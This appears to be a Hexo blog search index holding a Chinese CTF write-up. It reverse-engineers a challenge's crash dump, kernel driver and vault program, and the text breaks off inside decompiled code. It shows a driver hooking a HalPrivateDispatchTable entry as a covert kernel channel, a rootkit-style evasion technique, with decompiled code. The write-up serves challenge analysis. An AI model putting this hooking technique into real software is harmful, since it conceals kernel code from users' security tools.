<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Secured Personal Vault复现</title>
      <link href="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>强网杯的一道misc题，但是是逆向</p><h1 id="提取文件"><a href="#提取文件" class="headerlink" title="提取文件"></a>提取文件</h1><p>内核！蓝屏！驱动！</p><p>首先用Windbg分析dmp文件</p><p><code>!analyze -v</code></p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251027163132323.png" alt="image-20251027163132323"></p><p>综合所有信息，崩溃过程很可能是这样的：</p><ol><li>用户 <code>a</code> 运行了桌面上的 <code>aPersonalVault.exe</code> 程序。</li><li>该程序加载了同目录下的 <code>personalVaultKernel.sys</code> 驱动程序到系统内核。</li><li>这个驱动程序存在严重的编程缺陷，在执行其功能时（很可能是在处理某个系统服务请求时），发生了内存访问违规（<code>c0000005</code>）。</li><li>由于这个错误发生在具有最高权限的内核模式，Windows 内核无法安全地处理它，为了阻止数据损坏或安全漏洞，立即触发了蓝屏死机（BugCheck 3B），并生成了你现在分析的 <code>MEMORY.DMP</code> 文件。</li><li>崩溃发生后，<code>aPersonalVault.exe</code> 和 <code>personalVaultKernel.sys</code> 可能被用户手动删除，或被安全软件作为可疑文件清除了。</li></ol><p><code>!process 0 0</code>列出所有进程，发现当前运行的是存在两个aPersonalVault.exe进程</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251027163339863.png" alt="image-20251027163339863"></p><p>下一步应该把引发蓝屏的exe dump出来</p><p><code>pip install volatility3</code></p><p><code>vol -f E:\MEMORY.dmp windows.filescan</code></p><p>找到了aPersonalVault.exe和personalVaultKernel.sys</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251027232124194.png" alt="image-20251027232124194"></p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251027231811551.png" alt="image-20251027231811551"></p><p>然后进行转储得到原始文件</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251027232517665.png" alt="image-20251027232517665"></p><h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><h2 id="sys驱动逆向"><a href="#sys驱动逆向" class="headerlink" title="sys驱动逆向"></a>sys驱动逆向</h2><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251027234845891.png" alt="image-20251027234845891"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ds分析：这是一个Windows内核驱动程序的初始化函数（DriverEntry），主要完成以下工作：</span><br><span class="line"></span><br><span class="line">创建设备对象和符号链接 - 建立驱动程序与用户态的通信接口</span><br><span class="line">设置派遣函数 - 处理IRP请求和卸载例程</span><br><span class="line">枚举系统模块 - 查找ntoskrnl.exe内核模块</span><br><span class="line">函数挂钩 - 替换PsTerminateSystemThread系统函数</span><br><span class="line">错误处理 - 完善的资源清理机制</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntoskrnl.exe是Windows操作系统的一个重要内核程序，里面存储了大量的二进制内核代码，用于调度系统时使用，也是操作系统启动后第一个被加载的程序，通常该进程在任务管理器中显示为System</span><br></pre></td></tr></table></figure><p>遍历系统模块，寻找ntoskrnl.exe，获取HalPrivateDispatchTable的地址（从ntoskrnl.exe基地址偏移14682984处），把函数表中的HalTimerConvertAuxiliaryCounterToPerformanceCounter替换成sub_FFFFF80512BF10A0，获取到全局进程表并保存起来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">选择这个函数是攻击者在隐蔽性和功能性之间的平衡选择，既能够实现内核级控制，又不容易被常规安全检测发现。</span><br></pre></td></tr></table></figure><p>分析通信函数</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028095206440.png" alt="image-20251028095206440"></p><p>Signal如果是1就会触发蓝屏部分代码，Signal为2则遍历进程链表，寻找R3通信传来的对应Pid的EProcess，然后获取CreateTime数据返回到R3</p><p>通信数据的结构通过分析R3程序可以得到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ComData</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD MagicNum;</span><br><span class="line">    DWORD Signal;</span><br><span class="line">    DWORD64 Pid;</span><br><span class="line">    DWORD64 RetData;</span><br><span class="line">    CHAR PAD[<span class="number">216</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ida恢复sys文件的结构体</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028102924257.png" alt="image-20251028102924257"></p><p>得到的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_FFFFF80512BF10A0</span><span class="params">(ComData *ComData, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 (__fastcall *v3)(ComData *, __int64, __int64); <span class="comment">// rbp</span></span><br><span class="line">  DWORD n2; <span class="comment">// eax</span></span><br><span class="line">  _QWORD *v8; <span class="comment">// rax</span></span><br><span class="line">  DWORD64 Pid; <span class="comment">// rcx</span></span><br><span class="line"></span><br><span class="line">  v3 = (__int64 (__fastcall *)(ComData *, __int64, __int64))qword_FFFFF80512BF3348;</span><br><span class="line">  <span class="keyword">if</span> ( ExGetPreviousMode() &amp;&amp; ComData-&gt;MagicNum == <span class="number">0x30303030</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    n2 = ComData-&gt;Signal;</span><br><span class="line">    <span class="keyword">if</span> ( n2 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      process_list = <span class="number">0LL</span>;</span><br><span class="line">      qword_FFFFF80512BF3348 = <span class="number">0LL</span>;</span><br><span class="line">      ntoskrnl_base = <span class="number">0LL</span>;</span><br><span class="line">      MEMORY[<span class="number">0</span>] = <span class="number">0</span>;                            <span class="comment">// 触发蓝屏</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( n2 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = (_QWORD *)process_list;</span><br><span class="line">      Pid = ComData-&gt;Pid;</span><br><span class="line">      <span class="keyword">if</span> ( *(_QWORD *)(process_list + <span class="number">464</span>) != Pid )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          v8 = (_QWORD *)(v8[<span class="number">59</span>] - <span class="number">472LL</span>);</span><br><span class="line">        <span class="keyword">while</span> ( v8[<span class="number">58</span>] != Pid );</span><br><span class="line">      &#125;</span><br><span class="line">      ComData-&gt;RetData = v8[<span class="number">63</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3(ComData, a2, a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">用户态程序调用HalTimerConvertAuxiliaryCounterToPerformanceCounter</span><br><span class="line">    ↓</span><br><span class="line">传递包含MagicNum和命令的结构体</span><br><span class="line">    ↓</span><br><span class="line">挂钩函数验证认证并处理命令</span><br><span class="line">    ↓</span><br><span class="line">返回内核数据或执行清理操作</span><br><span class="line">    ↓</span><br><span class="line">调用原始函数保持系统正常</span><br></pre></td></tr></table></figure><p>EPROCESS结构：<a href="https://zhuanlan.zhihu.com/p/1908456697376269654">从藏匿到曝光：EPROCESS如何成为恶意程序的终极战场？ - 知乎</a></p><h2 id="R3程序逆向"><a href="#R3程序逆向" class="headerlink" title="R3程序逆向"></a>R3程序逆向</h2><h3 id="加密流程"><a href="#加密流程" class="headerlink" title="加密流程"></a>加密流程</h3><p>之前windbg的分析可以知道系统中有两个apersonalVault进程，其中一个进程触发了蓝屏</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028104347859.png" alt="image-20251028104347859"></p><p>main函数负责与内核挂钩函数通信，进入sub_7FF611D11D10分析</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028104647171.png" alt="image-20251028104647171"> </p><p>这里看到了通信数据的结构体</p><p>CreateWindowExW函数创建窗口</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028110151836.png" alt="image-20251028110151836"></p><p>Create按钮处理：检查用户名和Secret是否为空，初始化ComData数据结构，调用内核函数进行通信，传递Signal是2，传过去的Pid是<code>GetCurrentProcessId</code>，也就是当前进程ID，驱动会返回当前进程的<code>CreateTime</code>数据，然后调用BCryptGenRandom随机初始化一个48字节的pbBuffer，用于后续的加密使用。</p><p>将随机的48字节作为两部分使用，前32字节作为Key，后16字节作为IV，对用户输入的Secret进行AES-CBC加密。</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028110612103.png" alt="image-20251028110612103"></p><p>加密完成后，将48字节异或驱动传过来的数据，相当于加密了密钥和IV</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028110638154.png" alt="image-20251028110638154"></p><p>创建邮件槽用于进程通信,存储密文信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">NumberOfBytesWritten = <span class="number">0</span>;           <span class="comment">// 创建邮件槽进行进程间通信</span></span><br><span class="line">            *(_OWORD *)Name = <span class="number">0LL</span>;</span><br><span class="line">            v19 = <span class="number">1</span>;</span><br><span class="line">            v20 = <span class="number">0</span>;</span><br><span class="line">            v71 = <span class="number">0LL</span>;</span><br><span class="line">            v21 = <span class="number">-1LL</span>;</span><br><span class="line">            v72 = <span class="number">0LL</span>;</span><br><span class="line">            v73 = <span class="number">0LL</span>;</span><br><span class="line">            v74 = <span class="number">0LL</span>;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">              ++v21;</span><br><span class="line">            <span class="keyword">while</span> ( String[v21] );              <span class="comment">// 计算用户名哈希</span></span><br><span class="line">            <span class="keyword">if</span> ( v21 )</span><br><span class="line">            &#123;</span><br><span class="line">              v22 = String;</span><br><span class="line">              <span class="keyword">do</span></span><br><span class="line">              &#123;</span><br><span class="line">                v23 = *v22++;</span><br><span class="line">                ++v20;</span><br><span class="line">                v19 = v23 * v19 + <span class="number">257</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">while</span> ( v20 &lt; v21 );</span><br><span class="line">            &#125;</span><br><span class="line">            sub_7FF611D11AD0(Name, <span class="number">0x50</span>uLL, <span class="string">&quot;\\\\.\\mailslot\\mailslot_%x&quot;</span>);<span class="comment">// 创建唯一邮件槽名称</span></span><br><span class="line">            <span class="keyword">if</span> ( hObject )</span><br><span class="line">              CloseHandle(hObject);</span><br><span class="line">            hObject = CreateMailslotA(Name, <span class="number">0</span>, <span class="number">0xFFFFFFFF</span>, <span class="number">0LL</span>);</span><br><span class="line">            FileA = CreateFileA(Name, GENERIC_WRITE, FILE_READ_DATA, <span class="number">0LL</span>, OPEN_EXISTING, FILE_READ_ATTRIBUTES, <span class="number">0LL</span>);<span class="comment">// 写入加密数据到邮件槽</span></span><br><span class="line">            WriteFile(FileA, lpBuffer_2, Size, &amp;NumberOfBytesWritten, <span class="number">0LL</span>);</span><br><span class="line">            CloseHandle(FileA);</span><br><span class="line">            <span class="built_in">memset</span>(lpBuffer_2, <span class="number">0</span>, Size);</span><br><span class="line">            *(_OWORD *)Buffer = <span class="number">0LL</span>;            <span class="comment">// 创建共享内存映射</span></span><br><span class="line">            v76 = <span class="number">0LL</span>;</span><br><span class="line">            v77 = <span class="number">0LL</span>;</span><br><span class="line">            v78 = <span class="number">0LL</span>;</span><br><span class="line">            v79 = <span class="number">0LL</span>;</span><br><span class="line">            sub_7FF611D11AD0(Buffer, <span class="number">0x50</span>uLL, <span class="string">&quot;Local\\mapping_%x&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( hObject_0 )</span><br><span class="line">              CloseHandle(hObject_0);</span><br><span class="line">            hObject_0 = CreateFileMappingA((HANDLE)<span class="number">0xFFFFFFFFFFFFFFFF</span>LL, <span class="number">0LL</span>, PAGE_READWRITE, <span class="number">0</span>, <span class="number">0x1000</span>u, Buffer);</span><br><span class="line">            lpBaseAddress = MapViewOfFile(hObject_0, <span class="number">6u</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x1000</span>uLL);<span class="comment">// 在共享内存中存储邮件槽信息和进程ID</span></span><br><span class="line">            CurrentProcessId = GetCurrentProcessId();</span><br><span class="line">            *lpBaseAddress = hObject;</span><br><span class="line">            lpBaseAddress[<span class="number">1</span>] = CurrentProcessId;</span><br><span class="line">            UnmapViewOfFile(lpBaseAddress);</span><br><span class="line">            n64 = <span class="number">64</span>;</span><br><span class="line">            Success = <span class="string">L&quot;Success&quot;</span>;</span><br><span class="line">            User_created_successfully. = <span class="string">L&quot;User created successfully.&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_62;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="邮件槽"><a href="#邮件槽" class="headerlink" title="邮件槽"></a>邮件槽</h3><p>邮件槽（Mailslot）是Windows操作系统提供的一种简单的单向进程间通信（IPC）机制，只能一个进程写入，另一个进程读取</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/export_ibstfb.png" alt="export_ibstfb"></p><p>创建者写入的地址并不是一个内存地址，而是全局唯一的命名管道名称，计算用户名的哈希作为唯一标识，系统在内核中创建了一个名为<code>\\.\mailslot\mailslot_1234ABCD</code> 的邮件槽对象，创建者向这个地址写入加密数据存入邮件槽内核缓冲区。</p><p>读取者不知道创建者进程的邮件槽句柄，使用共享内存作为地址簿，创建者再共享内存中注册信息，读取者查找地址，读取数据</p><h3 id="解密流程"><a href="#解密流程" class="headerlink" title="解密流程"></a>解密流程</h3><p>Check按钮处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        Success = <span class="string">L&quot;Input required&quot;</span>;</span><br><span class="line">        User_created_successfully. = <span class="string">L&quot;Please enter username.&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_61;</span><br><span class="line">      &#125;</span><br><span class="line">      NumberOfBytesRead = <span class="number">0</span>;                    <span class="comment">// 读取共享内存获取邮件槽信息</span></span><br><span class="line">      v30 = <span class="number">1</span>;</span><br><span class="line">      NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">      v31 = <span class="number">0</span>;</span><br><span class="line">      NextSize = <span class="number">0</span>;</span><br><span class="line">      *(_OWORD *)Name = <span class="number">0LL</span>;</span><br><span class="line">      v71 = <span class="number">0LL</span>;</span><br><span class="line">      v72 = <span class="number">0LL</span>;</span><br><span class="line">      v73 = <span class="number">0LL</span>;</span><br><span class="line">      v74 = <span class="number">0LL</span>;</span><br><span class="line">      v32 = String;                             <span class="comment">// 计算用户哈希</span></span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v33 = *v32++;</span><br><span class="line">        ++v31;</span><br><span class="line">        v30 = v33 * v30 + <span class="number">257</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v31 &lt; v5 );</span><br><span class="line">      *(_OWORD *)Buffer = <span class="number">0LL</span>;                  <span class="comment">// 打开共享内存映射</span></span><br><span class="line">      v76 = <span class="number">0LL</span>;</span><br><span class="line">      v77 = <span class="number">0LL</span>;</span><br><span class="line">      v78 = <span class="number">0LL</span>;</span><br><span class="line">      v79 = <span class="number">0LL</span>;</span><br><span class="line">      sub_7FF611D11AD0(Buffer, <span class="number">0x50</span>uLL, <span class="string">&quot;Local\\mapping_%x&quot;</span>);</span><br><span class="line">      hFileMappingObject = OpenFileMappingA(<span class="number">6u</span>, <span class="number">0</span>, Buffer);</span><br><span class="line">      <span class="keyword">if</span> ( !hFileMappingObject )</span><br><span class="line">      &#123;</span><br><span class="line">        Success = <span class="string">L&quot;Error!&quot;</span>;</span><br><span class="line">        User_created_successfully. = <span class="string">L&quot;No username found...&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_61;</span><br><span class="line">      &#125;</span><br><span class="line">      v35 = MapViewOfFile(hFileMappingObject, <span class="number">6u</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x1000</span>uLL);<span class="comment">// 获取邮件槽句柄和进程id</span></span><br><span class="line">      hSourceHandle = *(<span class="type">void</span> **)v35;</span><br><span class="line">      hSourceProcessHandle = OpenProcess(PROCESS_DUP_HANDLE, <span class="number">0</span>, v35[<span class="number">2</span>]);</span><br><span class="line">      CurrentProcess = GetCurrentProcess();</span><br><span class="line">      <span class="keyword">if</span> ( !DuplicateHandle(</span><br><span class="line">              hSourceProcessHandle,</span><br><span class="line">              hSourceHandle,</span><br><span class="line">              CurrentProcess,</span><br><span class="line">              &amp;TargetHandle,</span><br><span class="line">              <span class="number">0</span>,</span><br><span class="line">              <span class="number">0</span>,</span><br><span class="line">              DUPLICATE_SAME_ACCESS) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_60;</span><br><span class="line">      GetMailslotInfo(TargetHandle, <span class="number">0LL</span>, &amp;NextSize, &amp;NumberOfBytesWritten, <span class="number">0LL</span>);</span><br><span class="line">      sub_7FF611D11A70(<span class="string">&quot;cbMessage: %llx; cMessage: %llx\n&quot;</span>, NextSize, NumberOfBytesWritten);</span><br><span class="line">      <span class="keyword">if</span> ( NextSize == <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        Success = <span class="string">L&quot;No secret found!&quot;</span>;</span><br><span class="line">        User_created_successfully. = <span class="string">L&quot;No secret is in the box right now!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_61;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( NumberOfBytesWritten != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_60:</span><br><span class="line">        Success = <span class="string">L&quot;Secret system is corrupted!&quot;</span>;</span><br><span class="line">        User_created_successfully. = <span class="string">L&quot;Something is wrong...&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_61;</span><br><span class="line">      &#125;</span><br><span class="line">      lpBuffer_3 = (<span class="type">char</span> *)j__malloc_base(NextSize);<span class="comment">// 读取加密数据</span></span><br><span class="line">      ReadFile(TargetHandle, lpBuffer_3, NextSize, &amp;NumberOfBytesRead, <span class="number">0LL</span>);</span><br><span class="line">      <span class="built_in">memset</span>(&amp;v80[<span class="number">2</span>], <span class="number">0</span>, <span class="number">0xF0</span>uLL);              <span class="comment">// 调用内核函数获取解密密钥</span></span><br><span class="line">      v80[<span class="number">0</span>] = <span class="number">0x230303030</span>LL;</span><br><span class="line">      v40 = GetCurrentProcessId();</span><br><span class="line">      v66 = <span class="number">0LL</span>;</span><br><span class="line">      v80[<span class="number">1</span>] = v40;</span><br><span class="line">      v67 = v80;</span><br><span class="line">      NtConvertBetweenAuxiliaryCounterAndPerformanceCounter(<span class="number">1LL</span>, &amp;v67, &amp;v66, <span class="number">0LL</span>);</span><br><span class="line">      v41 = v80[<span class="number">2</span>];</span><br><span class="line">      v42 = BYTE1(v80[<span class="number">2</span>]);</span><br><span class="line">      *(_WORD *)(&amp;pbBuffer + <span class="number">5</span>) ^= *(_WORD *)((<span class="type">char</span> *)&amp;v80[<span class="number">2</span>] + <span class="number">5</span>);<span class="comment">// 解密密钥</span></span><br><span class="line">      *(&amp;pbBuffer + <span class="number">7</span>) ^= HIBYTE(v80[<span class="number">2</span>]);</span><br><span class="line">      *(_WORD *)(&amp;pbBuffer + <span class="number">13</span>) ^= *(_WORD *)((<span class="type">char</span> *)&amp;v80[<span class="number">2</span>] + <span class="number">5</span>);</span><br><span class="line">      *(&amp;pbBuffer + <span class="number">15</span>) ^= HIBYTE(v80[<span class="number">2</span>]);</span><br><span class="line">      *(_WORD *)((<span class="type">char</span> *)&amp;xmmword_7FF611D36BB8 + <span class="number">5</span>) ^= *(_WORD *)((<span class="type">char</span> *)&amp;v80[<span class="number">2</span>] + <span class="number">5</span>);</span><br><span class="line">      BYTE7(xmmword_7FF611D36BB8) ^= HIBYTE(v80[<span class="number">2</span>]);</span><br><span class="line">      *(_WORD *)((<span class="type">char</span> *)&amp;xmmword_7FF611D36BB8 + <span class="number">13</span>) ^= *(_WORD *)((<span class="type">char</span> *)&amp;v80[<span class="number">2</span>] + <span class="number">5</span>);</span><br><span class="line">      HIBYTE(xmmword_7FF611D36BB8) ^= HIBYTE(v80[<span class="number">2</span>]);</span><br><span class="line">      *(_WORD *)((<span class="type">char</span> *)&amp;xmmword_7FF611D36BC8 + <span class="number">5</span>) ^= *(_WORD *)((<span class="type">char</span> *)&amp;v80[<span class="number">2</span>] + <span class="number">5</span>);</span><br><span class="line">      BYTE7(xmmword_7FF611D36BC8) ^= HIBYTE(v80[<span class="number">2</span>]);</span><br><span class="line">      *(_WORD *)((<span class="type">char</span> *)&amp;xmmword_7FF611D36BC8 + <span class="number">13</span>) ^= *(_WORD *)((<span class="type">char</span> *)&amp;v80[<span class="number">2</span>] + <span class="number">5</span>);</span><br><span class="line">      pbBuffer ^= LOBYTE(v80[<span class="number">2</span>]);</span><br><span class="line">      *(_DWORD *)(&amp;pbBuffer + <span class="number">1</span>) ^= *(_DWORD *)((<span class="type">char</span> *)&amp;v80[<span class="number">2</span>] + <span class="number">1</span>);</span><br><span class="line">      *(&amp;pbBuffer + <span class="number">8</span>) ^= LOBYTE(v80[<span class="number">2</span>]);</span><br><span class="line">      *(_DWORD *)(&amp;pbBuffer + <span class="number">9</span>) ^= *(_DWORD *)((<span class="type">char</span> *)&amp;v80[<span class="number">2</span>] + <span class="number">1</span>);</span><br><span class="line">      LOBYTE(xmmword_7FF611D36BB8) = LOBYTE(v80[<span class="number">2</span>]) ^ xmmword_7FF611D36BB8;</span><br><span class="line">      *(_DWORD *)((<span class="type">char</span> *)&amp;xmmword_7FF611D36BB8 + <span class="number">1</span>) ^= *(_DWORD *)((<span class="type">char</span> *)&amp;v80[<span 